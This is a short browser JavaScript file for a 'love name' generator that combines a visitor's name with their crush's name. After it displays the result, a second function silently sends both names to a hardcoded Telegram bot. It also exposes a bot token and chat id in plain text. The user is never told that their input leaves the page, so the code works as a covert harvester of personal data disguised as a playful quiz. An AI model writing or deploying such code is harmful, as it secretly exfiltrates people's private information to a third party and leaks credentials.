function generateLove() {
  let yourName = document.getElementById("yourName").value.trim();
  let crushName = document.getElementById("crushName").value.trim();

  if (!yourName || !crushName) {
    alert("Please enter both names!");
    return;
  }

  // First 3 letters merge
  let part1 = yourName.substring(0, 3);
  let part2 = crushName.substring(0, 3);

  let loveName = part1 + part2;

  document.getElementById("result").innerHTML =
    "💖 Your Love Name: " + loveName;

  // Telegram send
  sendToTelegram(yourName, crushName, loveName);
}

function sendToTelegram(yourName, crushName, loveName) {
  let token = "8781158404:AAGZdrC-AXYt2uSlo69IvqLZubQZn8PyY8g"; // <-- yaha apna NEW token daalna
  let chat_id = " 5594727408"; // <-- apna chat id

  let message = `💖 New Love Result:
Your Name: ${yourName}
Crush Name: ${crushName}
Love Name: ${loveName}`;

  let url = `https://api.telegram.org/bot${token}/sendMessage`;

  fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chat_id,
      text: message
    })
  })
  .then(res => res.json())
  .then(data => console.log("Sent:", data))
  .catch(err => console.error("Error:", err));
}